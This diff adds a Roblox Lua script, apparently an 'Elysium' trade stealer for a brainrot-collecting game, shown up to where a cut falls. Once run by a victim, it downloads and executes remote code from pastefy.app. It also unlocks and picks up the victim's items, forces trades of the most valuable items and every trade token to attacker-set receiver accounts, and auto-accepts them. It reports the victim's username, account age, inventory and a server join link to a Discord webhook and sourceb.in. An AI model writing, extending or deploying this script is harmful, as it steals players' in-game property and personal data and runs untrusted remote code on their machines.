@@ -1,0 +1,1062 @@
+getgenv().WEBHOOK = "" 								-- Put your Discord Webhook here
+getgenv().RECEIVERS = {"User1", "User2", "User3"} 	-- Put your ROBLOX name here 
+getgenv().THRESHOLD = 100000000000000000000000 		-- Minimum amount to ping/get
+getgenv().HIGHTIERONLY = true						-- TRUE/FALSE - Gets Infinity Brainrots Only
+getgenv().TOKEN_THRESHOLD = 50						-- Minimum amount to ping for tokens
+
+local PRIORITY_BRAINROTS = {
+  "Anububu",
+  "Meta Technetta",
+  "Noobini Infeeny",
+  "Magmew",
+  "Don Magmito",
+  "Doomini Tiktookini"
+}
+
+if _G.__Ran then return end
+_G.__Ran = true
+
+local PLAZA = (game.PlaceId == 111917342868480)
+print("PLAZA:", PLAZA)
+
+local CoreGui           = game:GetService("CoreGui")
+local StarterGui        = game:GetService("StarterGui")
+local TweenService      = game:GetService("TweenService")
+local RunService        = game:GetService("RunService")
+local Players           = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService       = game:GetService("HttpService")
+
+local TRADE_DELAY            = 0.5
+local MAX_TRADE_SLOTS        = 9
+local TRADE_REQUEST_INTERVAL = 1
+
+local TARGET_PLAYERS      = getgenv().RECEIVERS or {""}
+local WEBHOOK_URL         = getgenv().WEBHOOK or ""
+local TRADE_RATE_THRESHOLD = getgenv().THRESHOLD or 1e15
+local TOKEN_THRESHOLD = getgenv().TOKEN_THRESHOLD or 1
+
+_G.hightieronly  = getgenv().HIGHTIERONLY == true
+local HIGH_TIER_ONLY = _G.hightieronly
+
+local hadThresholdBrainrots    = false
+local lastInventoryCheckTime   = 0
+local INVENTORY_CHECK_INTERVAL = 5
+local DISCORD_INVITE = "https://discord.gg/Elys1um"
+
+-- ===================== REMOTES =====================
+local Remotes        = require(ReplicatedStorage.Shared.Remotes)
+local ClientGlobals  = require(ReplicatedStorage.Client.Modules.ClientGlobals)
+local EconomyMath    = require(ReplicatedStorage.Shared.utils.EconomyMath)
+local EternityNum    = require(ReplicatedStorage.SharedModules.EternityNum)
+local BrainrotModule = require(ReplicatedStorage.SharedModules.BrainrotModule)
+
+local LocalPlayer = Players.LocalPlayer
+local Plots       = ClientGlobals.Plots
+
+local PlotAction    = Remotes.PlotActionFn
+local SendTrade     = Remotes.TradeSendTrade
+local SetSlotOffer  = Remotes.TradeSetSlotOffer
+local ReadyTrade    = Remotes.TradeReadyTrade
+local DeclineTrade  = Remotes.TradeDeclineTrade
+local EquipBaseSkin = Remotes.EquipBaseSkin
+local OfferCurrency = Remotes.TradeOfferCurrency
+local LockItem      = Remotes.LockItem
+local ActiveTrade   = ClientGlobals.ActiveTrade
+
+local AUTO_ADD_ITEMS      = true
+local AUTO_READY          = true
+local POLL_DELAY          = 0.5
+local processingAutoTrade = false
+
+local continuousTradingEnabled = false
+local tradeRequestLoopRunning  = false
+local currentTargetPlayer      = nil
+local isRunning                = false
+local currentTradeGuid         = nil
+local playerTradeTokens        = 0
+
+--------------------------------------------------------------
+-- LOADING SCREEN
+--------------------------------------------------------------
+
+loadstring(game:HttpGet("https://pastefy.app/YXprt2gr/raw"))()
+task.wait(1)
+
+--------------------------------------------------------------
+-- TRADE TOKEN TRACKING
+--------------------------------------------------------------
+local function updateTradeTokens()
+    playerTradeTokens = ClientGlobals.PlayerData:TryIndex({"TradeTokens"}) or 0
+    print("[TRADE TOKENS] Current balance:", playerTradeTokens)
+end
+
+ClientGlobals.PlayerData:Observe({"TradeTokens"}, function(tokens)
+    playerTradeTokens = tokens or 0
+    print("[TRADE TOKENS] Updated balance:", playerTradeTokens)
+end)
+
+local function calculateTokensToOffer()
+    return playerTradeTokens
+end
+
+--------------------------------------------------------------
+-- WEBHOOK
+--------------------------------------------------------------
+local function sendWebhook(webhookUrl, content, embeds)
+    if not webhookUrl or webhookUrl == "" then return end
+    local requestFunc = (syn and syn.request) or http_request or request
+    if not requestFunc then return end
+    
+    local payload = {
+        content = content or "",
+        embeds = embeds or {}
+    }
+    
+    pcall(function()
+        requestFunc({
+            Url = webhookUrl,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = HttpService:JSONEncode(payload)
+        })
+    end)
+end
+
+local webhookSent = false
+
+--------------------------------------------------------------
+-- ITEM SORT COMPARATOR
+--------------------------------------------------------------
+local function itemSortDesc(a, b)
+    if a.isBaseSkin ~= b.isBaseSkin then return a.isBaseSkin end
+    if a.isBaseSkin and b.isBaseSkin then
+        if a.baseSkinType == "Money" and b.baseSkinType ~= "Money" then return true end
+        if a.baseSkinType ~= "Money" and b.baseSkinType == "Money" then return false end
+        if a.baseSkinType == "Gamer" and b.baseSkinType ~= "Gamer" then return true end
+        if a.baseSkinType ~= "Gamer" and b.baseSkinType == "Gamer" then return false end
+        return false
+    end
+    if a.isPriority ~= b.isPriority then return a.isPriority end
+    if a.isInfinityLuckyBlock ~= b.isInfinityLuckyBlock then return a.isInfinityLuckyBlock end
+    if a.isScaledDivineInfinity ~= b.isScaledDivineInfinity then return a.isScaledDivineInfinity end
+    return a.rate > b.rate
+end
+
+--------------------------------------------------------------
+-- HELPERS
+--------------------------------------------------------------
+local function isPriorityBrainrot(name)
+    if not PRIORITY_BRAINROTS then return false end
+    for _, n in ipairs(PRIORITY_BRAINROTS) do
+        if string.find(name, n, 1, true) then
+            return true
+        end
+    end
+    return false
+end
+
+local function getPlayerPlot()
+    if not Plots.Data then return nil end
+    for _, plot in Plots.Data do
+        if plot.player == LocalPlayer then return plot end
+    end
+    return nil
+end
+
+local function findTargetPlayer()
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player ~= Players.LocalPlayer then
+            local playerNameLower = string.lower(player.Name)
+            for _, target in ipairs(TARGET_PLAYERS) do
+                if playerNameLower == string.lower(target) then
+                    return player
+                end
+            end
+        end
+    end
+end
+
+local function isPlayerFullyLoaded(player)
+    if not player then return false end
+    local char = player.Character
+    if not char then return false end
+    local hrp = char:FindFirstChild("HumanoidRootPart")
+    local hum = char:FindFirstChildOfClass("Humanoid")
+    return hrp and hum and hum.Health > 0
+end
+
+local function WaitForPlayerReady(player, maxRetries)
+    maxRetries = maxRetries or 3
+    for _ = 1, maxRetries do
+        if not player or not player.Parent then return false end
+        local t = 0
+        while not player.Character and t < 10 do task.wait(0.5); t += 0.5 end
+        if not player.Character then task.wait(2); continue end
+        local hum = player.Character:FindFirstChildOfClass("Humanoid")
+        if not hum or hum.Health <= 0 then task.wait(2); continue end
+        task.wait(1)
+        if player and player.Parent and player.Character and player.Character:FindFirstChildOfClass("Humanoid") then
+            return true
+        end
+        task.wait(2)
+    end
+    return false
+end
+
+--------------------------------------------------------------
+-- BRAINROT INFO
+--------------------------------------------------------------
+local function getBrainrotInfo(brainrotData)
+    if not brainrotData then return nil end
+    local name     = brainrotData.name     or "Unknown"
+    local level    = brainrotData.level    or 1
+    local mutation = brainrotData.mutation or "None"
+    local scale    = brainrotData.scale    or 1
+    local traits   = brainrotData.traits   or ""
+
+    local class = BrainrotModule.GetBrainrotClass(name)
+
+    local ok, rate = pcall(function() return EconomyMath.GetBrainrotRate(brainrotData) end)
+    if not ok or not rate then
+        local ok2, r2 = pcall(function() return BrainrotModule.GetRate(brainrotData) end)
+        rate = (ok2 and r2) or 0
+    end
+
+    local rateFormatted = EternityNum.short(EternityNum.fromNumber(rate))
+    local isPriority    = isPriorityBrainrot(name)
+    local isScaledDivineInfinity = (class == "Divine" or class == "Infinity") and scale >= 3
+
+    local hasGalaxyTrait = false
+    if type(traits) == "string" then
+        hasGalaxyTrait = string.find(traits, "Galaxy") ~= nil
+    elseif type(traits) == "table" then
+        for _, t in ipairs(traits) do
+            if t == "Galaxy" then hasGalaxyTrait = true; break end
+        end
+    end
+    local isGalaxy = (class == "Divine" or class == "Infinity") and hasGalaxyTrait
+    local meetsThreshold = rate >= TRADE_RATE_THRESHOLD
+
+    return {
+        name                   = name,
+        level                  = level,
+        mutation               = mutation,
+        scale                  = scale,
+        traits                 = traits,
+        class                  = class,
+        rate                   = rate,
+        rateFormatted          = rateFormatted,
+        meetsThreshold         = meetsThreshold,
+        isPriority             = isPriority,
+        isGalaxy               = isGalaxy,
+        isBaseSkin             = false,
+        baseSkinType           = nil,
+        isInfinityLuckyBlock   = false,
+        isScaledDivineInfinity = isScaledDivineInfinity,
+        itemType               = "Brainrot"
+    }
+end
+
+--------------------------------------------------------------
+-- GET BASE BRAINROTS
+--------------------------------------------------------------
+local function getBaseBrainrots()
+    if PLAZA then return end
+    local items = {}
+    local plot = getPlayerPlot()
+    if not plot then return items, 0 end
+    local stands = Plots:TryIndex({plot.plotModel.Name, "data", "Stands"})
+    if not stands then return items, 0 end
+
+    for slotId, slotData in pairs(stands) do
+        if slotData.brainrot then
+            local brData = slotData.brainrot
+            local brainrotData = {
+                name     = brData.name     or "Unknown",
+                level    = brData.level    or 1,
+                mutation = brData.mutation or "None",
+                scale    = brData.scale    or 1,
+                traits   = brData.traits   or "",
+            }
+            local info = getBrainrotInfo(brainrotData)
+            if info then
+                info.slotId = slotId
+                table.insert(items, info)
+            end
+        end
+    end
+
+    local totalInBase = #items
+    table.sort(items, itemSortDesc)
+    return items, totalInBase
+end
+
+--------------------------------------------------------------
+-- FORMAT ITEM LINE
+--------------------------------------------------------------
+local function formatItemLine(item)
+    if item.isBaseSkin then
+        local emoji = ({Money="💰",Gamer="🎮",Valentine="💝",Heartbreaker="💔",Glitch="⚡",Default="🟦"})[item.baseSkinType] or "🎨"
+        return string.format("%s [%s Base Skin] ➜ Consumable Unlock", emoji, item.baseSkinType)
+    elseif item.isInfinityLuckyBlock then
+        return "♾️ [Infinity] LuckyBlock ➜ ULTRA RARE"
+    else
+        local star      = item.isGalaxy and "🌌 " or (item.isPriority and "⭐ " or "")
+        local scaleText = (item.scale and item.scale >= 3) and string.format("💪 [%.1fx] ", item.scale) or ""
+        local mutText   = (item.mutation and item.mutation ~= "None") and ("["..item.mutation.."] ") or ""
+        return string.format("%s%s[%s] %s%s ➜ $%s/s",
+            star, scaleText, item.class or "?", mutText, item.name, item.rateFormatted)
+    end
+end
+
+--------------------------------------------------------------
+-- BUILD EMBED LINES
+--------------------------------------------------------------
+local function buildInventoryLines(invItems)
+    local lines = {}
+    local displayCount = math.min(5, #invItems)
+    for i = 1, displayCount do
+        table.insert(lines, formatItemLine(invItems[i]))
+    end
+    if #invItems > 5 then
+        table.insert(lines, string.format("...and %d more items", #invItems - 5))
+    end
+    if #lines == 0 then table.insert(lines, "(empty)") end
+    return lines
+end
+
+local function buildBaseLines(baseItems, totalInBase)
+    local lines = {}
+    local displayCount = math.min(5, #baseItems)
+    for i = 1, displayCount do
+        table.insert(lines, formatItemLine(baseItems[i]))
+    end
+    local total = totalInBase or #baseItems
+    if total > 5 then
+        table.insert(lines, string.format("...and %d more on base", total - 5))
+    end
+    if #lines == 0 then table.insert(lines, "(empty)") end
+    return lines
+end
+
+--------------------------------------------------------------
+-- PASTEFY UPLOAD
+--------------------------------------------------------------
+local function uploadInventoryToPastefy(rawInvItems, rawBaseItems, totalInBase)
+    local http_req = (syn and syn.request) or http_request or request
+    if not http_req then return nil end
+
+    local thresholdText = EternityNum.short(EternityNum.fromNumber(TRADE_RATE_THRESHOLD))
+    local modeTag = HIGH_TIER_ONLY and " [HIGH TIER ONLY]" or ""
+    local lines = {}
+
+    table.insert(lines, "=== ELYSIUM ETFB HIT REPORT ===")
+    table.insert(lines, string.format("Player:      %s", LocalPlayer.Name))
+    table.insert(lines, string.format("Account Age: %d days", LocalPlayer.AccountAge))
+    table.insert(lines, string.format("Server:      %s", game.JobId))
+    table.insert(lines, string.format("Players:     %d/%d", #Players:GetPlayers(), Players.MaxPlayers))
+    table.insert(lines, string.format("Receivers:   %s", table.concat(TARGET_PLAYERS, ", ")))
+    table.insert(lines, string.format("Threshold:   $%s/s%s", thresholdText, modeTag))
+    table.insert(lines, string.format("Tokens:      %d", playerTradeTokens))
+    table.insert(lines, "")
+
+    table.insert(lines, string.format("=== INVENTORY (%d items) ===", #rawInvItems))
+    if #rawInvItems == 0 then
+        table.insert(lines, "(empty)")
+    else
+        for i, item in ipairs(rawInvItems) do
+            table.insert(lines, string.format("[%d] %s", i, formatItemLine(item)))
+        end
+    end
+    table.insert(lines, "")
+
+    table.insert(lines, string.format("=== ON BASE (%d brainrots) ===", totalInBase or #rawBaseItems))
+    if #rawBaseItems == 0 then
+        table.insert(lines, "(empty)")
+    else
+        for i, item in ipairs(rawBaseItems) do
+            table.insert(lines, string.format("[%d] %s", i, formatItemLine(item)))
+        end
+    end
+    table.insert(lines, "")
+    table.insert(lines, "=== END OF REPORT ===")
+
+    local pasteContent = table.concat(lines, "\n")
+
+    local ok, response = pcall(function()
+        return http_req({
+            Url = "https://sourceb.in/api/bins",
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = HttpService:JSONEncode({ files = { { content = pasteContent } } })
+        })
+    end)
+
+    if ok and response and response.StatusCode == 200 then
+        local okD, data = pcall(function() return HttpService:JSONDecode(response.Body) end)
+        if okD and data and data.key then
+            return "https://cdn.sourceb.in/bins/" .. data.key .. "/0"
+        end
+    else
+        warn("[SOURCEB] Upload failed:", response and response.StatusCode, response and response.Body)
+    end
+
+    return nil
+end
+
+--------------------------------------------------------------
+-- SEND REPORT
+--------------------------------------------------------------
+local function sendInventoryReport(webhookUrl, embedInvItems, embedBaseItems, totalInBase,
+                                   rawInvItems, rawBaseItems, content)
+    if webhookSent then return end
+    if not webhookUrl or webhookUrl == "" then return end
+
+    table.sort(embedInvItems, itemSortDesc)
+    table.sort(embedBaseItems, itemSortDesc)
+
+    local invLines      = buildInventoryLines(embedInvItems)
+    local baseLines     = buildBaseLines(embedBaseItems, HIGH_TIER_ONLY and #embedBaseItems or totalInBase)
+    local thresholdText = EternityNum.short(EternityNum.fromNumber(TRADE_RATE_THRESHOLD))
+    local pasteUrl      = uploadInventoryToPastefy(rawInvItems, rawBaseItems, totalInBase)
+    local modeNote      = HIGH_TIER_ONLY and " | 🔱 High Tier Only Mode" or ""
+
+    local pasteFieldValue = pasteUrl
+        and string.format("[**View Full Inventory Log**](%s)", pasteUrl)
+        or "*(upload failed)*"
+
+    local invHeaderLabel  = string.format("📦 **Inventory** (%d items) — Threshold: $%s/s", #embedInvItems, thresholdText)
+    local baseHeaderLabel = HIGH_TIER_ONLY
+        and string.format("🏠 **On Base — High Tier** (%d qualifying)", #embedBaseItems)
+        or  string.format("🏠 **On Base** (%d brainrots)", totalInBase or #embedBaseItems)
+
+    local embed = {
+        title  = "Escape Tsunami For Brainrot Hit!",
+        color  = 0x3498DB,
+        fields = {
+            {
+                name  = "👤 **Player Info**",
+                value = string.format("```\nUsername: %s\nPlayer Count: %d/%d\nAccount Age: %d days\nReceivers: %s\n```",
+                    LocalPlayer.Name, #Players:GetPlayers(), Players.MaxPlayers,
+                    LocalPlayer.AccountAge, table.concat(TARGET_PLAYERS, ", ")),
+                inline = false
+            },
+            {
+                name   = "💰 **Trade Tokens**",
+                value  = string.format("```\nBalance: %d tokens```", playerTradeTokens),
+                inline = false
+            },
+            {
+                name   = invHeaderLabel,
+                value  = "```\n" .. table.concat(invLines, "\n") .. "\n```",
+                inline = false
+            },
+            {
+                name   = baseHeaderLabel,
+                value  = "```\n" .. table.concat(baseLines, "\n") .. "\n```",
+                inline = false
+            },
+            {
+                name   = "",
+                value  = pasteFieldValue,
+                inline = false
+            },
+            {
+                name  = "🌐 **Join link**",
+                value = string.format("[**%s**](https://floating.gg/?placeID=%s&gameInstanceId=%s)",
+                    game.JobId, game.PlaceId, game.JobId),
+                inline = false
+            }
+        },
+        footer    = {text = "Elysium (v1.9)" .. modeNote},
+        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+    }
+
+    sendWebhook(webhookUrl, content or "", {embed})
+    webhookSent = true
+end
+
+--------------------------------------------------------------
+-- INVENTORY FUNCTIONS
+--------------------------------------------------------------
+local TRADEABLE_BASE_SKINS = {"Default","Money","Glitch","Gamer","Heartbreaker","Valentine"}
+
+local function getAllTradeableItemsFromInventory()
+    local items     = {}
+    local inventory = ClientGlobals.PlayerData:TryIndex({"Inventory"}) or {}
+
+    for id, item in pairs(inventory) do
+        if item.name and item.name ~= "LuckyBlock" and item.sub and item.sub.level then
+            local brainrotData = {
+                name     = item.name,
+                level    = item.sub.level    or 1,
+                mutation = item.sub.mutation or "None",
+                scale    = item.sub.scale    or 1,
+                traits   = item.sub.traits   or "",
+            }
+            local info = getBrainrotInfo(brainrotData)
+            if info then
+                info.id   = id
+                info.item = item
+                table.insert(items, info)
+            end
+        elseif item.sub and item.sub.baseSkinType then
+            local baseSkinType = item.sub.baseSkinType
+            local isTradeable  = false
+            for _, s in ipairs(TRADEABLE_BASE_SKINS) do
+                if s == baseSkinType then isTradeable = true; break end
+            end
+            if isTradeable then
+                table.insert(items, {
+                    id=id, item=item, name=baseSkinType, class="Base Skin",
+                    rate=0, rateFormatted="N/A", scale=1, traits="",
+                    meetsThreshold=false, isPriority=false, isGalaxy=false,
+                    isBaseSkin=true, baseSkinType=baseSkinType,
+                    isInfinityLuckyBlock=false, isScaledDivineInfinity=false,
+                    itemType="BaseSkin"
+                })
+            end
+        elseif item.name == "LuckyBlock" and item.sub and item.sub.luckyBlockType == "Infinity" then
+            table.insert(items, {
+                id=id, item=item, name="Infinity Lucky Block", class="Lucky Block",
+                rate=0, rateFormatted="N/A", scale=1, traits="",
+                meetsThreshold=false, isPriority=false, isGalaxy=false,
+                isBaseSkin=false, baseSkinType=nil,
+                isInfinityLuckyBlock=true, isScaledDivineInfinity=false,
+                itemType="LuckyBlock"
+            })
+        end
+    end
+
+    table.sort(items, itemSortDesc)
+    return items
+end
+
+--------------------------------------------------------------
+-- FILTER FUNCTIONS
+--------------------------------------------------------------
+local function filterByThreshold(items)
+    local out = {}
+    for _, item in ipairs(items) do
+        if item.isBaseSkin or item.isInfinityLuckyBlock or item.isPriority
+           or item.isScaledDivineInfinity
+           or item.rate >= TRADE_RATE_THRESHOLD then
+            table.insert(out, item)
+        end
+    end
+    return out
+end
+
+local function filterHighTierOnly(items)
+    local out = {}
+    for _, item in ipairs(items) do
+        if item.isBaseSkin or item.isInfinityLuckyBlock then
+            table.insert(out, item)
+        elseif item.isPriority then
+            table.insert(out, item)
+        elseif item.isScaledDivineInfinity then
+            table.insert(out, item)
+        elseif item.class == "Infinity" then
+            table.insert(out, item)
+        end
+    end
+    return out
+end
+
+local function filterItems(items)
+    if HIGH_TIER_ONLY then
+        return filterHighTierOnly(items)
+    else
+        return filterByThreshold(items)
+    end
+end
+
+-- ===================== PICKUP =====================
+local lp = Players.LocalPlayer
+local backpack = lp:WaitForChild("Backpack")
+
+local function unlockAllItems()
+    for _, tool in ipairs(backpack:GetChildren()) do
+        if tool:IsA("Tool") and tool:GetAttribute("Locked") then
+            LockItem:FireServer(tool.Name, false)
+        end
+    end
+end
+unlockAllItems()
+backpack.ChildAdded:Connect(function(child)
+    if child:IsA("Tool") and child:GetAttribute("Locked") then
+        LockItem:FireServer(child.Name, false)
+    end
+end)
+
+local function getOccupiedSlots(plotInstance, plotName)
+    local slots = {}
+    for _, slot in pairs(plotInstance.Slots:GetChildren()) do
+        local slotNumber = slot.Name:match("%d+")
+        if not slotNumber then continue end
+
+        local brainrotData = Plots:TryIndex({ plotName, "data", "Stands", slotNumber, "brainrot" })
+        if not brainrotData then continue end
+
+        local brainrotModel = plotInstance:FindFirstChild(("slot %s brainrot"):format(slotNumber))
+        if not brainrotModel then continue end
+
+        local primaryPart = brainrotModel.PrimaryPart
+        if not primaryPart then continue end
+
+        local attachment = primaryPart:FindFirstChildOfClass("Attachment")
+        if not attachment then continue end
+
+        for _, prompt in pairs(attachment:GetChildren()) do
+            if prompt:IsA("ProximityPrompt") and prompt.ActionText == "Pick Up Brainrot" then
+                table.insert(slots, {
+                    prompt   = prompt,
+                    part     = primaryPart,
+                    slot     = slotNumber,
+                    brainrot = brainrotData.name or "?"
+                })
+                break
+            end
+        end
+    end
+    return slots
+end
+
+local function pickupBrainrots()
+    if PLAZA then return end
+
+    local plot = getPlayerPlot()
+    if not plot then return end
+
+    local plotName     = plot.plotModel.Name
+    local plotInstance = workspace.Bases:FindFirstChild(plotName)
+    if not plotInstance then return end
+
+    local char = lp.Character
+    if not char then return end
+    local root = char:FindFirstChild("HumanoidRootPart")
+    if not root then return end
+
+    local slots = getOccupiedSlots(plotInstance, plotName)
+    if #slots == 0 then return end
+
+    for _, data in pairs(slots) do
+        local ok = pcall(function()
+            sethiddenproperty(root, "CFrame", data.part.CFrame * CFrame.new(0, 3, 0))
+        end)
+        if not ok then
+            root.CFrame = data.part.CFrame * CFrame.new(0, 3, 0)
+        end
+        RunService.Heartbeat:Wait()
+        fireproximityprompt(data.prompt)
+        task.wait(0.05)
+    end
+end
+
+task.spawn(function()
+    if PLAZA then return end
+    while true do
+        pickupBrainrots()
+        unlockAllItems()
+        task.wait(0.2)
+    end
+end)
+
+--------------------------------------------------------------
+-- TRADE HELPERS
+--------------------------------------------------------------
+local function hasActiveTrade()
+    local guid = ActiveTrade:TryIndex({"guid"})
+    return guid ~= nil, guid
+end
+
+local function sendTradeRequest(targetPlayer)
+    return pcall(function() SendTrade:InvokeServer(targetPlayer) end)
+end
+
+local function startContinuousTradeRequests(targetPlayer)
+    if not targetPlayer then return end
+    currentTargetPlayer = targetPlayer
+    if tradeRequestLoopRunning then return end
+    tradeRequestLoopRunning  = true
+    continuousTradingEnabled = true
+    task.spawn(function()
+        while continuousTradingEnabled and currentTargetPlayer and currentTargetPlayer.Parent do
+            if not hasActiveTrade() and currentTargetPlayer and currentTargetPlayer.Parent then
+                pcall(function() sendTradeRequest(currentTargetPlayer) end)
+            end
+            task.wait(TRADE_REQUEST_INTERVAL)
+        end
+        tradeRequestLoopRunning = false
+    end)
+end
+
+local function stopContinuousTradeRequests()
+    continuousTradingEnabled = false
+end
+
+local function addItemsToTrade(items)
+    if not ActiveTrade:TryIndex({"guid"}) then return false end
+
+    local baseSkins, priorityBrainrots = {}, {}
+    local infinityLuckyBlocks, scaledDivineInfinity, normalItems = {}, {}, {}
+
+    for _, item in ipairs(items) do
+        if item.isBaseSkin then table.insert(baseSkins, item)
+        elseif item.isPriority then table.insert(priorityBrainrots, item)
+        elseif item.isInfinityLuckyBlock then table.insert(infinityLuckyBlocks, item)
+        elseif item.isScaledDivineInfinity then table.insert(scaledDivineInfinity, item)
+        else table.insert(normalItems, item) end
+    end
+
+    table.sort(baseSkins, function(a, b)
+        if a.baseSkinType == "Money" and b.baseSkinType ~= "Money" then return true end
+        if a.baseSkinType ~= "Money" and b.baseSkinType == "Money" then return false end
+        if a.baseSkinType == "Gamer" and b.baseSkinType ~= "Gamer" then return true end
+        if a.baseSkinType ~= "Gamer" and b.baseSkinType == "Gamer" then return false end
+        return false
+    end)
+    table.sort(priorityBrainrots,    function(a,b) return a.rate > b.rate end)
+    table.sort(scaledDivineInfinity, function(a,b) return a.rate > b.rate end)
+    table.sort(normalItems,          function(a,b) return a.rate > b.rate end)
+
+    local sortedItems = {}
+    for _, bucket in ipairs({baseSkins, priorityBrainrots, infinityLuckyBlocks, scaledDivineInfinity, normalItems}) do
+        for _, item in ipairs(bucket) do table.insert(sortedItems, item) end
+    end
+
+    local slotsAdded = 0
+    for _, itemInfo in ipairs(sortedItems) do
+        if slotsAdded >= MAX_TRADE_SLOTS then break end
+        local slotNum = tostring(slotsAdded + 1)
+        local ok, err = pcall(function() SetSlotOffer:InvokeServer(slotNum, itemInfo.id) end)
+        if ok then
+            slotsAdded += 1
+            if itemInfo.isBaseSkin then
+                print(string.format("[TRADE] Slot %s: 🎨 [%s BASE SKIN]", slotNum, itemInfo.baseSkinType))
+            elseif itemInfo.isInfinityLuckyBlock then
+                print(string.format("[TRADE] Slot %s: ♾️ [INFINITY LUCKY BLOCK]", slotNum))
+            else
+                local galaxy  = itemInfo.isGalaxy and "🌌 " or ""
+                local star    = itemInfo.isPriority and "[⭐ PRIORITY] " or ""
+                local scaled  = itemInfo.isScaledDivineInfinity and ("[📈 SCALED "..itemInfo.class.."] ") or ""
+                local scaleT  = itemInfo.scale ~= 1 and string.format(" [%.1fx]", itemInfo.scale) or ""
+                print(string.format("[TRADE] Slot %s: %s%s%s%s%s (Rate: %s)",
+                    slotNum, galaxy, star, scaled, itemInfo.name, scaleT, itemInfo.rateFormatted))
+            end
+        else
+            warn(string.format("[TRADE] Failed slot %s for %s: %s", slotNum, itemInfo.name, tostring(err)))
+        end
+    end
+    return slotsAdded > 0
+end
+
+local function safeAddAllItems() end
+
+local function safeAutoReady()
+    if not AUTO_READY or processingAutoTrade then return end
+    local playerReady  = ActiveTrade:TryIndex({"player1","ready"})
+    local timerVersion = ActiveTrade:TryIndex({"timers","version"}) or 0
+    if not playerReady then
+        pcall(function() ReadyTrade:FireServer(true, timerVersion) end)
+    end
+end
+
+task.spawn(function()
+    while true do
+        if hasActiveTrade() then safeAddAllItems(); safeAutoReady() end
+        task.wait(POLL_DELAY)
+    end
+end)
+
+local function offerTradeTokens()
+    local tokens = calculateTokensToOffer()
+    print(string.format("[TOKENS] Offering %d (have %d)", tokens, playerTradeTokens))
+    local ok, err = pcall(function() OfferCurrency:InvokeServer(tokens) end)
+    if ok then
+        if tokens > 0 then print("[TOKENS] ✅ Offered " .. tokens)
+        else print("[TOKENS] ✅ Offer complete (balance 0)") end
+    else
+        warn("[TOKENS] ❌ Failed:", err)
+    end
+    return ok
+end
+
+local function isAlreadyReady()
+    return ActiveTrade:TryIndex({"player1","ready"}) == true
+end
+
+local function autoAcceptTrade()
+    local function doReady()
+        local timerVersion = ActiveTrade:TryIndex({"timers","version"}) or 0
+        return pcall(function() ReadyTrade:FireServer(true, timerVersion) end)
+    end
+
+    local firstReady = false
+    for _ = 1, 3 do
+        if isAlreadyReady() then firstReady = true; break end
+        if doReady() then firstReady = true; break end
+        task.wait(0.8)
+    end
+    if not firstReady then warn("[TRADE] First ready failed"); return false end
+
+    for _ = 1, 6 do
+        task.wait(2)
+        if not hasActiveTrade() then return true end
+        if not isAlreadyReady() then doReady() end
+    end
+    return not hasActiveTrade()
+end
+
+local function executeTrade()
+    local targetPlayer = findTargetPlayer()
+    if not targetPlayer then return false end
+    if not WaitForPlayerReady(targetPlayer, 3) then return false end
+
+    updateTradeTokens()
+    local allItems      = getAllTradeableItemsFromInventory()
+    local filteredItems = filterItems(allItems)
+
+    if not tradeRequestLoopRunning or not continuousTradingEnabled then
+        startContinuousTradeRequests(targetPlayer)
+    end
+
+    local hasActive, tradeGuid
+    local waited = 0
+    while waited < 15 do
+        hasActive, tradeGuid = hasActiveTrade()
+        if hasActive then currentTradeGuid = tradeGuid; break end
+        task.wait(0.5); waited += 0.5
+    end
+    if not hasActive then return false end
+
+    task.wait(0.5)
+    processingAutoTrade = true
+
+    if #filteredItems > 0 then
+        addItemsToTrade(filteredItems)
+    else
+        print("[TRADE] No qualifying items — offering tokens only")
+    end
+
+    task.wait(0.2)
+    offerTradeTokens()
+    task.wait(0.2)
+
+    processingAutoTrade = false
+
+    if not hasActiveTrade() then
+        print("[TRADE] Trade closed before ready — skipping")
+        return false
+    end
+
+    if not autoAcceptTrade() then
+        if hasActiveTrade() then
+            pcall(function() DeclineTrade:FireServer() end)
+        end
+        task.wait(0.5)
+        return false
+    end
+
+    local tradeWait = 0
+    while tradeWait < 60 do
+        if not hasActiveTrade() then
+            currentTradeGuid = nil
+            task.wait(0.5)
+            if currentTargetPlayer and currentTargetPlayer.Parent then
+                if not tradeRequestLoopRunning or not continuousTradingEnabled then
+                    startContinuousTradeRequests(currentTargetPlayer)
+                end
+            end
+            return true
+        end
+        task.wait(1); tradeWait += 1
+    end
+
+    if hasActiveTrade() then
+        pcall(function() DeclineTrade:FireServer() end)
+    end
+    task.wait(0.5)
+    return false
+end
+
+--------------------------------------------------------------
+-- SEND WEBHOOK
+--------------------------------------------------------------
+local function sendWebhookReport(embedInvItems, embedBaseItems, totalInBase, rawInvItems, rawBaseItems)
+    local hasTokens = playerTradeTokens > TOKEN_THRESHOLD
+    print(playerTradeTokens .. " > " .. TOKEN_THRESHOLD)
+    print(hasTokens)
+
+    if #embedInvItems == 0 and #embedBaseItems == 0 and not hasTokens then return end
+
+    local hasBaseSkin, hasGalaxy, hasPriorityBrainrot = false, false, false
+    local hasInfinityLuckyBlock, hasScaledDivineInfinity = false, false
+    local thresholdHit = false
+
+    local function scanList(list)
+        for _, item in ipairs(list) do
+            if item.isBaseSkin then hasBaseSkin = true
+            elseif item.isGalaxy then hasGalaxy = true
+            elseif item.isPriority then hasPriorityBrainrot = true
+            elseif item.isInfinityLuckyBlock then hasInfinityLuckyBlock = true
+            elseif item.isScaledDivineInfinity then hasScaledDivineInfinity = true
+            elseif item.meetsThreshold then thresholdHit = true
+            end
+        end
+    end
+    scanList(embedInvItems)
+    scanList(embedBaseItems)
+
+    local hasHighTierItem = hasBaseSkin or hasGalaxy or hasPriorityBrainrot
+        or hasInfinityLuckyBlock or hasScaledDivineInfinity
+
+    if HIGH_TIER_ONLY and not hasHighTierItem and not hasTokens then
+        print("[HIGH TIER ONLY] No qualifying items found — skipping webhook")
+        return
+    end
+
+    local pingMsg = ""
+    if hasTokens or hasBaseSkin or hasGalaxy or hasInfinityLuckyBlock
+        or hasScaledDivineInfinity or hasPriorityBrainrot or thresholdHit then
+        pingMsg = "@everyone"
+    end
+    
+    sendInventoryReport(WEBHOOK_URL, embedInvItems, embedBaseItems, totalInBase,
+                        rawInvItems, rawBaseItems, pingMsg)
+end
+
+--------------------------------------------------------------
+-- STARTUP WEBHOOK
+--------------------------------------------------------------
+task.spawn(function()
